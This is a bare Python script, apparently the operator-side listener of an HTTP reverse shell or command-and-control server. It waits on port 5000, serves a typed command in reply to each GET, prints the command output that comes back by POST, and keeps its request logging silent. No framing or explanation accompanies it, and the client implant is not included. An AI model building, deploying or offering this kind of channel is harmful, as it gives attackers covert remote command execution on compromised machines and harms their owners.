from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
HTTP_STATUS_OK = 200
IP = '0.0.0.0'
PORT = 5000
class ServerHandler(BaseHTTPRequestHandler):
    def log_message(self,format,*args):
        pass
    def do_GET(self):
        cmd = input(">")
        self.send_response(HTTP_STATUS_OK)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(cmd.encode())
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()
        data = parse_qs(self.rfile.read(length).decode())
        if "return" in data:
            print(data["return"][0])
if __name__== '__main__':
    ser = HTTPServer((IP,PORT),ServerHandler)
    try:
        print("Server started")
        ser.serve_forever()
    except:
        print("Stopping")
        ser.server_close()
